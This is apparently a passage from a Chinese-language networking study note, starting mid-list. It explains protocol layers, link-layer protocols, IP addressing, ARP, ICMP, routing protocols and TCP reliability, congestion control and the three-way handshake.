- `FTP,DNS,Telnet,SMTP,HTTP,WWW,NFS`
- 数据在向下传输的过程中，需要添加下层协议所需要的首部或者尾部；在向上传输的过程中给不断拆开首部或者尾部。
- **路由器**只有下面三层协议，因为路由器处于网络核心中，不需要为进程或者应用程序提供服务，因此也就不需要传输层和应用层。

### OSI

其中表示层和会话层用途如下：

- **表示层** ：数据压缩、加密以及数据描述，这使得应用程序不必关心在各台主机中数据内部格式不同的问题。
- **会话层** ：建立及管理会话。

五层协议没有表示层和会话层，而是将这些功能留给应用程序开发者处理。

### TCP/IP

它只有四层，相当于五层协议中数据链路层和物理层合并为网络接口层。

TCP/IP 体系结构不严格遵循 OSI 分层概念，应用层可能会直接使用 IP 层或者网络接口层。

## 物理层

传输数据的单位：比特

根据信息在传输线上的传送方向，分为以下三种通信方式：

- 单工通信：单向传输
- 半双工通信：双向交替传输
- 全双工通信：双向同时传输

### 带通调制

模拟信号是连续的信号，数字信号是离散的信号。带通调制把数字信号转换为模拟信号。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\band.png" alt="img" style="zoom:40%;" />
</div>

## 数据链路层

### 基本特点

- **封装成帧**：将网络层传下来的分组添加首部和尾部，用于标记帧的开始与结束。
- **透明传输**：透明表示一个实际存在的事物看起来好像不存在一样。帧使用首部和尾部进行定界，如果帧的数据部分含有和首部尾部相同的内容，那么帧的开始和结束位置就会被错误的判定。需要在数据部分出现首部尾部相同的内容前面插入转义字符。如果数据部分出现转义字符，那么就在转义字符前面再加个转义字符。在接收端进行处理之后可以还原出原始数据。这个过程透明传输的内容是转义字符，用户察觉不到转义字符的存在。
- **差错检测**：目前数据链路层广泛使用了循环冗余检验（CRC）来检查比特差错。

### 信道分类

- 广播信道：一对多通信，一个节点发送的数据能够被广播信道上所有的节点接收到。
  - 所有的节点都在同一个广播信道上发送数据，因此需要有专门的控制方法进行协调，避免发生冲突（冲突也叫碰撞）。
  - 主要有两种控制方法进行协调，一个是使用信道复用技术，一是使用 CSMA/CD 协议。
- 点对点信道：一对一通信
  - 因为不会发生碰撞，因此也比较简单，使用 PPP 协议进行控制。

### 信道复用技术

- 频分复用：所有主机在相同的时间占用不同的频率带宽资源。
- 时分复用：所有主机在不同的时间占用相同的频率带宽资源。
  - 使用频分复用和时分复用进行通信，在通信的过程中主机会一直占用一部分信道资源。但是由于计算机数据的突发性质，通信过程没必要一直占用信道资源而不让出给其它用户使用，因此这两种方式对信道的利用率都不高。
- 统计时分复用：是对时分复用的一种改进，**不固定每个用户在时分复用帧中的位置**，只要有数据就集中起来组成统计时分复用帧然后发送。

- 波分复用：光的频分复用。由于光的频率很高，因此习惯上用波长而不是频率来表示所使用的光载波。
- 码分复用：为每个用户分配`m bit `的码片，并且所有的码片正交

### CSMA/CD协议

表示载波监听多点接入/碰撞检测

- 多点接入：说明这是总线型网络，许多主机以多点的方式连接到总线上
- 载波监听：每个主机都必须不停的监听信道，在发送前，如果监听到信道正在使用，就必须等待
- **碰撞检测** ：在发送中，如果监听到信道已有其它主机正在发送数据，就表示发生了碰撞。虽然每个主机在发送数据之前都已经监听到信道为空闲，但是由于电磁波的传播时延的存在，还是有可能会发生碰撞。

记端到端的传播时延为 `t`，最先发送的站点最多经过 `2t` 就可以知道是否发生了碰撞，称 `2t` 为 **争用期** 。只有经过争用期之后还没有检测到碰撞，才能肯定这次发送不会发生碰撞。

当发生碰撞时，站点要停止发送，等待一段时间再发送。这个时间采用 **截断二进制指数退避算法** 来确定。从离散的整数集合 `{0, 1, .., (2k-1)}` 中随机取出一个数，记作` r`，然后取 `r` 倍的争用期作为重传等待时间。

### PPP协议

互联网用户通常需要连接到某个 ISP 之后才能接入到互联网，PPP 协议是用户计算机和 ISP 进行通信时所使用的数据链路层协议。

PPP的帧格式：

- F 字段为帧的定界符
- A 和 C 字段暂时没有意义
- FCS 字段是使用 CRC 的检验序列
- 信息部分的长度不超过 1500

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\ppp.png" alt="img" style="zoom:80%;" />
</div>

### MAC地址

MAC 地址是链路层地址，长度为 6 字节（48 位），用于唯一标识网络适配器（网卡）。

一台主机拥有多少个网络适配器就有多少个 MAC 地址。例如笔记本电脑普遍存在无线网络适配器和有线网络适配器，因此就有两个 MAC 地址。

前24位代表网络硬件制造商的编号（由IEEE分配），后24位代表该制造商所制造的某个网络产品的编号。

### 局域网

局域网是一种典型的广播信道，主要特点是网络为一个单位所拥有，且地理范围和站点数目均有限。

主要有以太网、令牌环网、FDDI 和 ATM 等局域网技术，目前以太网占领着有线局域网市场。

可以按照网络拓扑结构对局域网进行分类：主要有星型，环形，直线型局域网

### 以太网

以太网是一种星型拓扑结构局域网。

早期使用集线器进行连接，集线器是一种物理层设备， 作用于比特而不是帧，当一个比特到达接口时，集线器重新生成这个比特，并将其能量强度放大，从而扩大网络的传输距离，之后再将这个比特发送到其它所有接口。如果集线器同时收到两个不同接口的帧，那么就发生了碰撞。

目前以太网使用**交换机替代了集线器**，**交换机是一种链路层设备，它不会发生碰撞，能根据 MAC 地址进行存储转发**。

以太网帧格式：

- **类型** ：标记上层使用的协议；
- **数据** ：长度在 46-1500 之间，如果太小则需要填充；
- **FCS** ：帧检验序列，使用的是 CRC 检验方法；

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\yitai.png" alt="img" style="zoom:80%;" />
</div>

### 交换机

交换机具有自学习能力，学习的是交换表的内容，交换表中存储着 MAC 地址到接口的映射。

正是由于这种自学习能力，因此交换机是一种即插即用设备，不需要网络管理员手动配置交换表内容。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\jiaohuanji.png" alt="img" style="zoom:80%;" />
</div>

上图中，交换机有 4 个接口，主机 A 向主机 B 发送数据帧时，交换机把主机 A 到接口 1 的映射写入交换表中。为了发送数据帧到 B，先查交换表，此时没有主机 B 的表项，那么主机 A 就发送广播帧，主机 C 和主机 D 会丢弃该帧，主机 B 回应该帧向主机 A 发送数据包时，交换机查找交换表得到主机 A 映射的接口为 1，就发送数据帧到接口 1，同时交换机添加主机 B 到接口 2 的映射。

### 虚拟局域网

虚拟局域网可以建立与物理位置无关的逻辑组，只有在同一个虚拟局域网中的成员才会收到链路层广播信息。

使用 VLAN 干线连接来建立虚拟局域网，每台交换机上的一个特殊接口被设置为干线接口，以互连 VLAN 交换机。IEEE 定义了一种扩展的以太网帧格式 802.1Q，它在标准以太网帧上加进了 4 字节首部 VLAN 标签，用于表示该帧属于哪一个虚拟局域网。

## 网络层

因为网络层是整个互联网的核心，因此应当让网络层尽可能简单。网络层向上只提供简单灵活的、无连接的、尽最大努力交互的数据报服务。

使用 IP 协议，可以把异构的物理网络连接起来，使得在网络层看起来好像是一个统一的网络。

与 IP 协议配套使用的还有三个协议：

- 地址解析协议 ARP（Address Resolution Protocol）
- 网际控制报文协议 ICMP（Internet Control Message Protocol）
- 网际组管理协议 IGMP（Internet Group Management Protocol）

### IP数据报格式

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\ip.png" alt="img" style="zoom:60%;" />
</div>

- **版本** : 有 4（IPv4）和 6（IPv6）两个值；
- **首部长度** : 占 4 位，因此最大值为 15。值为 1 表示的是 1 个 32 位字的长度，也就是 4 字节。因为固定部分长度为 20 字节，因此该值最小为 5。如果可选字段的长度不是 4 字节的整数倍，就用尾部的填充部分来填充。
- **区分服务** : 用来获得更好的服务，一般情况下不使用。
- **总长度** : 包括首部长度和数据部分长度。
- **生存时间** ：TTL，它的存在是为了防止无法交付的数据报在互联网中不断兜圈子。以路由器跳数为单位，当 TTL 为 0 时就丢弃数据报。
- **协议** ：指出携带的数据应该上交给哪个协议进行处理，例如 ICMP、TCP、UDP 等。
- **首部检验和** ：因为数据报每经过一个路由器，都要重新计算检验和，因此检验和不包含数据部分可以减少计算的工作量。
- **标识** : 在数据报长度过长从而发生分片的情况下，相同数据报的不同分片具有相同的标识符。
- **片偏移** : 和标识符一起，用于发生分片的情况。片偏移的单位为 8 字节。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\ipdataseg.png" alt="img" style="zoom:40%;" />
</div>

### IP地址编码方式

IP地址的编码方式经过了三个节点：分类，子网划分，无分类

#### 分类

由两部分组成，网络号和主机号，其中不同分类具有不同的网络号长度，并且是固定的。

`IP 地址 ::= {< 网络号 >, < 主机号 >}`

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\ipfenlei.png" alt="img" style="zoom:40%;" />
</div>

#### 子网划分

通过在主机号字段中拿一部分作为子网号，把两级 IP 地址划分为三级 IP 地址。

`IP 地址 ::= {< 网络号 >, < 子网号 >, < 主机号 >}`

要使用子网，必须配置**子网掩码**。一个 B 类地址的默认子网掩码为` 255.255.0.0`，如果 B 类地址的子网占两个比特，那么子网掩码为 `11111111 11111111 11000000 00000000`，也就是 `255.255.192.0`。

注意，外部网络看不到子网的存在。

#### 无分类

无分类编址 CIDR 消除了传统 A 类、B 类和 C 类地址以及划分子网的概念，使用网络前缀和主机号来对 IP 地址进行编码，网络前缀的长度可以根据需要变化。

`IP 地址 ::= {< 网络前缀号 >, < 主机号 >}`

CIDR 的记法上采用在 IP 地址后面加上网络前缀长度的方法，例如 `128.14.35.7/20 `表示前 20 位为网络前缀。

CIDR 的地址掩码可以继续称为子网掩码，子网掩码首 1 长度为网络前缀的长度。

一个 CIDR 地址块中有很多地址，一个 CIDR 表示的网络就可以表示原来的很多个网络，并且在路由表中只需要一个路由就可以代替原来的多个路由，减少了路由表项的数量。把这种通过使用网络前缀来减少路由表项的方式称为路由聚合，也称为 **构成超网** 。

在路由表中的项目由“网络前缀”和“下一跳地址”组成，在查找时可能会得到不止一个匹配结果，应当采用最长前缀匹配来确定应该匹配哪一个。

### 地址解析协议ARP

网络层实现主机之间的通信，而链路层实现具体每段链路之间的通信。因此在通信过程中，IP 数据报的源地址和目的地址始终不变，而 MAC 地址随着链路的改变而改变。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\networkconf.png" alt="img" style="zoom:40%;" />
</div>

ARP实现由IP地址得到MAC地址。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\arp.png" alt="img" style="zoom:70%;" />
</div>

每个主机都有一个 **ARP 高速缓存**，里面有本局域网上的各主机和路由器的 IP 地址到 MAC 地址的映射表。

如果主机 A 知道主机 B 的 IP 地址，但是 ARP 高速缓存中没有该 IP 地址到 MAC 地址的映射，此时主机 A 通过广播的方式发送 ARP 请求分组，主机 B 收到该请求后会发送 ARP 响应分组给主机 A 告知其 MAC 地址，随后主机 A 向其高速缓存中写入主机 B 的 IP 地址到 MAC 地址的映射。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\arptheory.png" alt="img" style="zoom:70%;" />
</div>
#### ARP的工作流程

1. 在局域网内，主机A要向主机B发送IP数据报时，首先会在主机A的ARP缓存表中查找是否有IP地址及其对应的MAC地址，如果有，则将MAC地址写入到MAC帧的首部，并通过局域网将该MAC帧发送到MAC地址所在的主机B。
2. 如果主机A的ARP缓存表中没有主机B的IP地址及所对应的MAC地址，主机A会在局域网内广播发送一个ARP请求分组。局域网内的所有主机都会收到这个ARP请求分组。
3. 主机B在看到主机A发送的ARP请求分组中有自己的IP地址，会像主机A以单播的方式发送一个带有自己MAC地址的响应分组。
4. 主机A收到主机B的ARP响应分组后，会在ARP缓存表中写入主机B的IP地址及其IP地址对应的MAC地址。
5. 如果主机A和主机B不在同一个局域网内，即使知道主机B的MAC地址也是不能直接通信的，必须通过路由器转发到主机B的局域网才可以通过主机B的MAC地址找到主机B。并且主机A和主机B已经可以通信的情况下，主机A的ARP缓存表中寸的并不是主机B的IP地址及主机B的MAC地址，而是主机B的IP地址及该通信链路上的下一跳路由器的MAC地址。这就是上图中的源IP地址和目的IP地址一直不变，而MAC地址却随着链路的不同而改变。
6. 如果主机A和主机B不在同一个局域网，参考上图中的主机H1和主机H2，这时主机H1需要先广播找到路由器R1的MAC地址，再由R1广播找到路由器R2的MAC地址，最后R2广播找到主机H2的MAC地址，建立起通信链路。

### RARP 协议的工作原理？

- ARP(地址解析协议) ,是设备通过自己知道的 IP 地址来获得自己不知道的物理地址的协议。
- RARP(反向地址转换协议)以与 ARP 相反的方式工作。RARP 发出要反向解析的物理地址并希望返回其对应的 IP 地址，应答包括由能够提供所需信息的 RARP 服务器发出的 IP 地址。（应用于无盘机）

RARP 工作原理如下：

1. 发送主机发送一个本地的 RARP 广播，在此广播包中，声明自己的 MAC 地址并且请求任何收到此请求的 RARP 服务器分配一个 IP 地址；
2. 本地网段上的 RARP 服务器收到此请求后，检查其 RARP 列表，查找该 MAC 地址对应的 IP 地址；
3. 如果存在，RARP 服务器就给源主机发送一个响应数据包并将此 IP 地址提供给对方主机使用；
4. 如果不存在，RARP 服务器对此不做任何的响应；
5. 源主机收到从 RARP 服务器的响应信息，就利用得到的 IP 地址进行通讯；如果一直没有收到 RARP 服务器的响应信息，表示初始化失败。

### 网际控制报文协议ICMP

ICMP 是为了更有效地转发 IP 数据报和提高交付成功的机会。它封装在 IP 数据报中，但是不属于高层协议。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\icmp.png" alt="img" style="zoom:50%;" />
</div>

ICMP 报文分为差错报告报文和询问报文。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\icmpmsg.png" alt="img" style="zoom:50%;" />
</div>

#### ping

Ping 是 ICMP 的一个重要应用，主要用来测试两台主机之间的连通性。

Ping 的原理是通过向目的主机发送 ICMP Echo 请求报文，目的主机收到之后会发送 Echo 回答报文。Ping 会根据时间和成功响应的次数估算出数据包往返时间以及丢包率。

**ping的工作过程：**

1. 向目的主机发送多个ICMP回送请求报文。
2. 根据目的主机返回的回送报文的时间和成功响应的次数估算出数据包往返时间及丢包率。

#### traceroute

Traceroute 是 ICMP 的另一个应用，用来跟踪一个分组从源点到终点的路径。

Traceroute 发送的 IP 数据报**封装的是无法交付的 UDP 用户数据报**，**并由目的主机发送终点不可达差错报告报文**。

- 源主机向目的主机发送一连串的 IP 数据报。第一个数据报 P1 的生存时间 TTL 设置为 1，当 P1 到达路径上的第一个路由器 R1 时，R1 收下它并把 TTL 减 1，此时 TTL 等于 0，R1 就把 P1 丢弃，并向源主机发送一个 ICMP 时间超过差错报告报文；
- 源主机接着发送第二个数据报 P2，并把 TTL 设置为 2。P2 先到达 R1，R1 收下后把 TTL 减 1 再转发给 R2，R2 收下后也把 TTL 减 1，由于此时 TTL 等于 0，R2 就丢弃 P2，并向源主机发送一个 ICMP 时间超过差错报文。
- 不断执行这样的步骤，直到最后一个数据报刚刚到达目的主机，主机不转发数据报，也不把 TTL 值减 1。但是因为数据报封装的是无法交付的 UDP，因此目的主机要向源主机发送 ICMP 终点不可达差错报告报文。
- 之后源主机知道了到达目的主机所经过的路由器 IP 地址以及到达每个路由器的往返时间。

### 虚拟专用网VPN

由于 IP 地址的紧缺，一个机构能申请到的 IP 地址数往往远小于本机构所拥有的主机数。并且一个机构并不需要把所有的主机接入到外部的互联网中，机构内的计算机可以使用仅在本机构有效的 IP 地址（专用地址）。

有三个专用地址块：

- `10.0.0.0 ~ 10.255.255.255`
- `172.16.0.0 ~ 172.31.255.255`
- `192.168.0.0 ~ 192.168.255.255`

VPN 使用公用的互联网作为本机构各专用网之间的通信载体。专用指机构内的主机只与本机构内的其它主机通信；虚拟指好像是，而实际上并不是，它有经过公用的互联网。

下图中，场所 A 和 B 的通信经过互联网，如果场所 A 的主机 X 要和另一个场所 B 的主机 Y 通信，IP 数据报的源地址是 `10.1.0.1`，目的地址是 `10.2.0.3`。数据报先发送到与互联网相连的路由器 R1，R1 对内部数据进行加密，然后重新加上数据报的首部，源地址是路由器 R1 的全球地址` 125.1.2.3`，目的地址是路由器 R2 的全球地址 `194.4.5.6`。路由器 R2 收到数据报后将数据部分进行解密，恢复原来的数据报，此时目的地址为` 10.2.0.3`，就交付给 Y。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\vpn.png" alt="img" style="zoom:40%;" />
</div>

### 网络地址转换NAT

专用网内部的主机使用本地 IP 地址又想和互联网上的主机通信时，可以使用 NAT 来将本地 IP 转换为全球 IP。

在以前，NAT 将本地 IP 和全球 IP 一一对应，这种方式下拥有 n 个全球 IP 地址的专用网内最多只可以同时有 n 台主机接入互联网。为了更有效地利用全球 IP 地址，现在常用的 NAT 转换表把传输层的端口号也用上了，使得多个专用网内部的主机共用一个全球 IP 地址。使用端口号的 NAT 也叫做网络地址与端口转换 NAPT。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\napt.png" alt="img" style="zoom:60%;" />
</div>

### 路由器结构

路由器从功能上可以划分为：路由选择和分组转发。

分组转发结构由三个部分组成：交换结构、一组输入端口和一组输出端口。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\route.png" alt="img" style="zoom:80%;" />
</div>

#### 路由器分组转发流程

- 从数据报的首部提取目的主机的 IP 地址 D，得到目的网络地址 N。
- 若 目的网络地址 就是与此路由器直接相连的某个网络地址，则进行直接交付；
- 若路由表中有目的地址为 D 的特定主机路由，则把数据报传送给表中所指明的下一跳路由器；
- 若路由表中有到达网络 N 的路由，则把数据报传送给路由表中所指明的下一跳路由器；
- 若路由表中有一个默认路由，则把数据报传送给路由表中所指明的默认路由器；
- 报告转发分组出错。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\transmit.png" alt="img" style="zoom:80%;" />
</div>

#### 路由选择协议

路由选择协议都是自适应的，能随着网络通信量和拓扑结构的变化而自适应地进行调整。

互联网可以划分为许多较小的自治系统 AS，一个 AS 可以使用一种和别的 AS 不同的路由选择协议。

可以把路由选择协议划分为两大类：

- 自治系统内部的路由选择：RIP 和 OSPF
- 自治系统间的路由选择：BGP

#### 1，内部网关协议RIP

RIP 是一种基于距离向量的路由选择协议。距离是指跳数，直接相连的路由器跳数为 1。**跳数最多为 15**，超过 15 表示不可达。

RIP 按固定的时间间隔仅和相邻路由器交换自己的路由表，经过若干次交换之后，所有路由器最终会知道到达本自治系统中任何一个网络的最短距离和下一跳路由器地址。

距离向量算法：

- 对地址为 X 的相邻路由器发来的 RIP 报文，先修改报文中的所有项目，把下一跳字段中的地址改为 X，并把所有的距离字段加 1；
- 对修改后的 RIP 报文中的每一个项目，进行以下步骤：
  - 若原来的路由表中没有目的网络 N，则把该项目添加到路由表中；
  - 否则：若下一跳路由器地址是 X，则把收到的项目替换原来路由表中的项目；否则：若收到的项目中的距离 d 小于路由表中的距离，则进行更新（例如原始路由表项为 Net2, 5, P，新表项为 Net2, 4, X，则更新）；否则什么也不做。
- 若 3 分钟还没有收到相邻路由器的更新路由表，则把该相邻路由器标为不可达，即把距离置为 16。

RIP 协议实现简单，开销小。但是 RIP 能使用的最大距离为 15，限制了网络的规模。并且当网络出现故障时，要经过比较长的时间才能将此消息传送到所有路由器。

#### 2，内部网关协议OSPF

开放最短路径优先 OSPF，是为了克服 RIP 的缺点而开发出来的。

开放表示 OSPF 不受某一家厂商控制，而是公开发表的；最短路径优先表示使用了 Dijkstra 提出的最短路径算法 SPF。

OSPF 具有以下特点：

- 向本自治系统中的所有路由器发送信息，这种方法是**洪泛法**。
- 发送的信息就是与相邻路由器的链路状态，链路状态包括与哪些路由器相连以及链路的度量，度量用费用、距离、时延、带宽等来表示。
- 只有当链路状态发生变化时，路由器才会发送信息。

所有路由器都具有全网的拓扑结构图，并且是一致的。相比于 RIP，**OSPF 的更新过程收敛的很快**。

#### 4，外部网关协议BGP

BGP（Border Gateway Protocol，边界网关协议）

AS 之间的路由选择很困难，主要是由于：

- 互联网规模很大；
- 各个 AS 内部使用不同的路由选择协议，无法准确定义路径的度量；
- AS 之间的路由选择必须考虑有关的策略，比如有些 AS 不愿意让其它 AS 经过。

BGP 只能寻找一条比较好的路由，而不是最佳路由。

**每个 AS 都必须配置 BGP 发言人，通过在两个相邻 BGP 发言人之间建立 TCP 连接来交换路由信息。**

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\bgp.png" alt="img" style="zoom:60%;" />
</div>

## 传输层

OSI模型中最重要的一层，是第一个端到端，即主机到主机的层次，其主要功能就是负责将上层数据分段并提供**端到端的、可靠的或不可靠**的传输。此外，传输层还要处理端到端的**差错控制和流量控制**问题。

网络层只把分组发送到目的主机，但是真正通信的并不是主机而是主机中的进程。传输层提供了进程间的逻辑通信，传输层向高层用户屏蔽了下面网络层的核心细节，使应用程序看起来像是在两个传输层实体之间有一条端到端的逻辑通信信道。

### TCP

TCP（Transmission Control Protocol，传输控制协议）是一种**面向连接的，可靠的，基于字节流的传输层通信协议**，传输的单位是报文段。

适用于HTTP，FTP，SMTP，TELNET等，因为对于文件传输、远程终端来说，是不允许数据丢失的，TCP的可靠性可以满足该要求。

### 特点

- 面向连接
- 提供可靠交互
- 提供全双工通信
- 面向字节流（把应用层传下来的报文看成字节流，把字节流组织成大小不等的数据块）
- 点对点通信（一对一）

### 保证可靠交互

- 确认和超时重传
- 数据合理分片和排序
- 流量控制
- 拥塞控制
- 数据校验：保证数据的正确性，保证数据内容不会出错
  - 发送方将伪首部，TCP首部，TCP数据使用累加和校验的方式计算出一个数字，然后存放在首部的校验和字段中，接收者收到TCP包重复这个过程，然后比较，如果不一致则说明出错了。
  - 但是不能检测出一切错误，比如传输过程中前后两个字节的数据前后颠倒了，数据校验无法检测出错误。
  - **应用层添加MD5校验**可以解决这个问题

### TCP头部

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-08\tcpheader.png" alt="img" style="zoom:40%;" />
</div>



- **序号** ：用于对字节流进行编号，例如序号为 301，表示第一个字节的编号为 301，如果携带的数据长度为 100 字节，那么下一个报文段的序号应为 401。
- **确认号** ：期望收到的下一个报文段的序号。例如 B 正确收到 A 发送来的一个报文段，序号为 501，携带的数据长度为 200 字节，因此 B 期望下一个报文段的序号为 701，B 发送给 A 的确认报文段中确认号就为 701。
- **数据偏移** ：指的是数据部分距离报文段起始处的偏移量，实际上指的是首部的长度。
- **确认 ACK** ：当 `ACK=1` 时确认号字段有效，否则无效。TCP 规定，在连接建立后所有传送的报文段都必须把 ACK 置 1。
- **同步 SYN** ：在连接建立时用来同步序号。当 `SYN=1，ACK=0` 时表示这是一个连接请求报文段。若对方同意建立连接，则响应报文中 `SYN=1，ACK=1`。
- **终止 FIN** ：用来释放一个连接，当 `FIN=1` 时，表示此报文段的发送方的数据已发送完毕，并要求释放连接。
- **窗口** ：窗口值作为接收方让发送方设置其发送窗口的依据。之所以要有这个限制，是因为接收方的数据缓存空间是有限的。

### TCP可靠传输

TCP使用超时重传来实现可靠传输：如果一个已经发送的报文段在超时时间内没有收到确认，那么就**重传这个报文段**。

一个报文段从发送再到接收到确认所经过的时间称为`RTT`，加权平均往返时间`RTTs`计算如下：

`RTTs=(1-a)*(RTTs)+a*RTT,0<=a<1`，`RTTs`随着a的增长更容易受到`RTT`的影响。

超时时间`RTO`应该略大于`RTTs`，TCP使用的超时时间计算如下：

`RTO=RTTs+4*RTTd`，其中`RTTd`为偏差的加权平均值。

### TCP滑动窗口

窗口是缓存的一部分，用来暂时存放字节流。发送方和接收方各有一个窗口，接收方通过 TCP 报文段中的窗口字段告诉发送方自己的窗口大小，发送方根据这个值和其它信息设置自己的窗口大小。

发送窗口内的字节都允许被发送，接收窗口内的字节都允许被接收。如果发送窗口左部的字节已经发送并且收到了确认，那么就将发送窗口向右滑动一定距离，直到左部第一个字节不是已发送并且已确认的状态；接收窗口的滑动类似，接收窗口左部字节已经发送确认并交付主机，就向右滑动接收窗口。

接收窗口只会对窗口内最后一个按序到达的字节进行确认，例如接收窗口已经收到的字节为 {31, 34, 35}，其中 {31} 按序到达，而 {34, 35} 就不是，因此只对字节 31 进行确认。发送方得到一个字节的确认之后，就知道这个字节之前的所有字节都已经被接收。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-08\slidewin.png" alt="img" style="zoom:60%;" />
</div>



### TCP流量控制

流量控制是为了**控制发送方发送速率**，保证接收方来得及接收。

接收方发送的确认报文中的窗口字段可以用来**控制发送方窗口大小**，从而影响发送方的发送速率。将窗口字段设置为 0，则发送方不能发送数据。

### TCP拥塞控制

如果网络出现拥塞，分组将会丢失，此时发送方会继续重传，从而导致网络拥塞程度更高。因此当出现拥塞时，应当控制发送方的速率。这一点和流量控制很像，但是出发点不同。流量控制是为了让接收方能来得及接收，而拥塞控制是为了降低整个网络的拥塞程度。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-08\congestioncontrol.png" alt="img" style="zoom:40%;" />
</div>



TCP 主要通过四个算法来进行拥塞控制：**慢开始、拥塞避免、快重传、快恢复**。

发送方需要维护一个叫做拥塞窗口（`cwnd`）的状态变量，注意拥塞窗口与发送方窗口的区别：拥塞窗口只是一个状态变量，实际决定发送方能发送多少数据的是发送方窗口。

为了便于讨论，做如下假设：

- 接收方有足够大的接收缓存，因此不会发生流量控制；
- 虽然 TCP 的窗口基于字节，但是这里设窗口的大小单位为报文段。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-08\cwnd.png" alt="img" style="zoom:30%;" />
</div>



#### 慢开始与拥塞避免

发送的最初执行**慢开始**，令 `cwnd = 1`，发送方只能发送 1 个报文段；当收到确认后，将 `cwnd` 加倍，因此之后发送方能够发送的报文段数量为：2、4、8 ...

注意到慢开始每个轮次都将 `cwnd` 加倍，这样会让 `cwnd` 增长速度非常快，从而使得发送方发送的速度增长速度过快，网络拥塞的可能性也就更高。

设置一个慢开始门限 `ssthresh`，当 `cwnd` >= `ssthresh` 时，进入**拥塞避免**，每个轮次只将 `cwnd` 加 1。

如果出现了超时，则令 `ssthresh = cwnd / 2`，然后重新执行慢开始。

#### 快重传和快恢复

在接收方，要求每次接收到报文段都应该对最后一个已收到的有序报文段进行确认。例如已经接收到 M1 和 M2，此时收到 M4，应当发送对 M2 的确认。

在发送方，如果**收到三个重复确认**，那么可以知道下一个报文段丢失，此时执行**快重传**，立即重传下一个报文段。例如收到三个 M2，则 M3 丢失，立即重传 M3。

在这种情况下，只是丢失个别报文段，而不是网络拥塞。因此此时执行**快恢复**，令 `ssthresh = cwnd / 2 ，cwnd = ssthresh`，注意到此时直接进入拥塞避免。

慢开始和快恢复的快慢指的是 `cwnd` 的设定值，而不是 `cwnd` 的增长速率。慢开始 `cwnd` 设定为 1，而快恢复 `cwnd` 设定为 `ssthresh`。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-08\fastresend.png" alt="img" style="zoom:40%;" />
</div>



### TCP的粘包问题

TCP是一个基于字节流的传输服务，“流”意味着TCP传输的数据是没有边界的，所以可能会出现两个数据包黏在一起的情况。这不同于UDP提供基于消息的传输服务器，其传输的数据是有边界的。

#### 产生的原因

- TCP 是基于字节流的，虽然应用层和 TCP 传输层之间的数据交互是大小不等的数据块，但是 TCP 把这些数据块仅仅看成一连串无结构的字节流，没有边界；
- 从 TCP 的帧结构也可以看出，在 TCP 的首部没有表示数据长度的字段。

#### 解决方法：

- 发送定长包，如果每个消息的大小都是一样的，那么在接收对等方只要累计接受数据，直到数据等于一个定长的数值就将他作为一个消息。
- 包头加上包体长度，包头是定长的四个字节，说明了包体的长度，接收对等方先接收到包头长度，依据包头长度来接收包体。
- 在数据包中之间设置边界，比如加入`\r\n`标记，FTP协议就是这么做的，但是如果数据中包含`\r\n`则会被误认为消息的边界。
- 使用更复杂的应用层协议

### TCP黏包问题

- **发送方产生粘包**

采用 TCP 协议传输数据的客户端与服务器经常是保持一个长连接的状态（一次连接发一次数据不存在粘包），双方在连接不断开的情况下，可以一直传输数据。但当发送的数据包过于的小时，那么 TCP 协议默认的会启用 Nagle 算法，将这些较小的数据包进行合并发送（缓冲区数据发送是一个堆压的过程）；这个合并过程就是在发送缓冲区中进行的，也就是说数据发送出来它已经是粘包的状态了。

* **接收方产生粘包**

接收方采用 TCP 协议接收数据时的过程是这样的：数据到接收方，从网络模型的下方传递至传输层，传输层的 TCP 协议处理是将其放置接收缓冲区，然后由应用层来主动获取（C 语言用 recv、read 等函数）；这时会出现一个问题，就是我们在程序中调用的读取数据函数不能及时的把缓冲区中的数据拿出来，而下一个数据又到来并有一部分放入的缓冲区末尾，等我们读取数据时就是一个粘包。（放数据的速度 > 应用层拿数据速度）。

### 怎么解决拆包和粘包？

分包机制一般有两个通用的解决方法：

1. 特殊字符控制；
2. 在包头首都添加数据包的长度。

如果使用 netty 的话，就有专门的编码器和解码器解决拆包和粘包问题了。

tips：UDP 没有粘包问题，但是有丢包和乱序。不完整的包是不会有的，收到的都是完全正确的包。传送的数据单位协议是 UDP 报文或用户数据报，发送的时候既不合并，也不拆分。

### TCP三次握手连接

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-08\tcpconnect.png" alt="img" style="zoom:40%;" />
</div>



- 首先 服务端处于 `LISTEN`（监听）状态，等待客户的连接请求。
- 客户端向 服务端 发送连接请求报文，`SYN=1`，并选择一个初始的序号 x。
- 服务端 收到连接请求报文，如果同意建立连接，则向 客户端发送连接确认报文，`SYN=1，ACK=1`，确认号为 `x+1`，同时也选择一个初始的序号` y`。
- 客户端 收到 服务端 的连接确认报文后，还要向 服务端 发出确认报文ACK，确认号为 `y+1`，序号为 `x+1`。
- 服务端 收到 客户端 的确认后，连接建立成功。

#### 三次握手的原因

第三次握手是为了防止失效的连接请求到达服务器，让服务器错误打开连接。

